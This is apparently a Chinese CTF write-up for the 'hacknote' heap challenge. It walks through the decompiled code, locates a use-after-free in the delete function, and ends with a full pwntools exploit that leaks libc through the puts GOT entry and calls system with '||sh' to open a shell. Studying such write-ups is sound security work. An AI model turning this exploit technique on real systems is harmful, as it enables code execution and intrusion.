---
title: hacknote
description: pwnable | heap | UAF
---
<!--more-->

##题目考点

 - UAF

##解题思路

 32位elf，菜单题，提供了add, del, print三个功能，依次查看:

 - add_note():
```c
unsigned int sub_8048646()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
//最多输入5个notes(del函数中并没有减少count的值)
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !ptr[i] )
      {
        ptr[i] = malloc(8u);
        if ( !ptr[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)ptr[i] = sub_804862B;
//结构体的第一个字段中包含一个函数指针
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = ptr[i];
        v0[1] = malloc(size);
//可自定义大小的content
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr[i] + 1), size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

 - del_note():

```c
unsigned int sub_80487D4()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( note[v1] )
  {
    free(*((void **)note[v1] + 1));
    free(note[v1]);
//漏洞点，free后没有将指针设置为NULL，触发UAF漏洞
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

 - pri_note():

```c
unsigned int sub_80488A5()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( note[v1] )
    (*(void (__cdecl **)(void *))note[v1])(note[v1]);
//通过函数指针来利用该漏洞，进而控制程序执行流程
  return __readgsdword(0x14u) ^ v3;
}
```

 为了操作方便，先定义几个函数:
```py
def addNote(len, con):
	p.recvuntil(b'Your choice :')
	p.send(b'1')
	p.recvuntil(b'Note size :')
	p.send(str(len).encode())
	p.recvuntil(b'Content :')
	p.send(con)
def delNote(idx):
	p.recvuntil(b'Your choice :')
	p.send(b'2')
	p.recvuntil(b'Index :')
	p.send(str(idx).encode())
def priNote(idx):
	p.recvuntil(b'Your choice :')
	p.send(b'3')
	p.recvuntil(b'Index :')
	p.send(str(idx).encode())
```

具体思路:
 - addNote(0x10, b'aaaa')，addNote(0x10, b'aaaa)，delNote(0)，delNote(1):
 	先加入note0和note1，再进行free，此时的 fast bin 中有note1->note0;
 - addNote(8, p32(puts) + p32(e.got['puts']))， priNote(0):
 	加入note2，其malloc操作从fast bin先分配chunk(即note1)给note2，再分配chunk(即note0)给note2的content，向此content中存入原程序提供的puts函数指针和got表中puts的地址，priNote(0)便会输出puts的got表上的地址，成功泄露libc地址;
 - delNote(2)，addNote(8, p32(system) + b'||sh')，priNote(0):
 	free掉note2，即之前的note0与note1的chunk回到fastbin中，接着再分配上述note1给note3，note0给note3的content，向content中存入systemaddr + '||sh'，priNote(0)调用system($system_addr || sh)，成功getshell;

##exploit

```py
from pwn import *

p	 = process("./hacknote")
e 	 = ELF("./hacknote")
libc = ELF("./libc_32.so.6")
#context.log_level = 'debug'
#input()
def addNote(len, con):
	p.recvuntil(b'Your choice :')
	p.send(b'1')
	p.recvuntil(b'Note size :')
	p.send(str(len).encode())
	p.recvuntil(b'Content :')
	p.send(con)
def delNote(idx):
	p.recvuntil(b'Your choice :')
	p.send(b'2')
	p.recvuntil(b'Index :')
	p.send(str(idx).encode())
def priNote(idx):
	p.recvuntil(b'Your choice :')
	p.send(b'3')
	p.recvuntil(b'Index :')
	p.send(str(idx).encode())

puts_func = 0x804862B
addNote(0x10, b'aaaa')
addNote(0x10, b'aaaa')
delNote(0)
delNote(1)
addNote(8, p32(puts_func) + p32(e.got['puts']))
priNote(0)
libc_base = u32(p.recv(4)) - libc.symbols['puts']
syst_addr = libc_base + libc.symbols['system']

delNote(2)
addNote(8, p32(syst_addr) + b'||sh')
priNote(0)

p.interactive()
```